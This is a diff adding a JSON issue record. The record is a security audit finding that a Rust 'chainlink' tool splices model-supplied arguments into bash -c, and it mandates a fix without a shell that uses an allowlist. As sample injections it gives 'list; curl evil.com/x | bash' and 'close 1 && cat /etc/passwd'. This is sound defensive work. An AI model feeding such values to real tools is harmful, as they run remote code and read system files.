@@ -1,0 +1,11 @@
+{
+  "uuid": "2c77e8ef-115e-4743-b22b-f6aacf64946d",
+  "display_id": 265,
+  "title": "Chainlink tool: raw arg interpolation into bash -c enables shell injection",
+  "description": "Steps to reproduce:\n1. \n\nExpected: \nActual: \n\n**Dimension:** Security and Access (OWASP A03 Injection)\n\n**Location:** /home/doll/OpenClaudia/src/tools/chainlink.rs lines 17-32\n\n**Violation:**\nexecute_chainlink takes the model-supplied 'args' string and concatenates it into a shell command: format!(\"chainlink {cmd_args}\") then passes the whole thing to bash -c. No quoting, no argument splitting, no allowlist of subcommands. An adversarial 'args' value such as 'list; curl evil.com/x | bash' or 'close 1 && cat /etc/passwd' will execute arbitrary shell. The injection is identical to SQLi: concatenating user data into a command interpreter without parameterization.\n\n**Mandated Refactor:**\n1. Do NOT shell out. Invoke crosslink via Command::new(\"crosslink\").args(parsed_args) directly, bypassing bash entirely.\n2. Parse 'args' with shlex or shell-words to split into argv tokens, then validate the first token against an allowlist: ['create','close','comment','label','list','show','subissue','session'].\n3. Reject tokens containing shell metacharacters (;, |, &, \\$, backtick, <, >, newline) at the perimeter before any further processing.\n4. Remove the Windows-specific Git Bash fallback (lines 17-28); Command::new(\"chainlink\") works cross-platform and does not require a shell.\n5. Add Result<Value, McpError>-style structured error returns instead of stringly-typed '(String, bool)' so the caller can distinguish 'chainlink not installed' from 'invalid subcommand' without substring matching.",
+  "status": "open",
+  "priority": "critical",
+  "created_by": "lOrm",
+  "created_at": "2026-04-18T00:28:01.581603122Z",
+  "updated_at": "2026-04-18T00:28:01.581603122Z"
+}
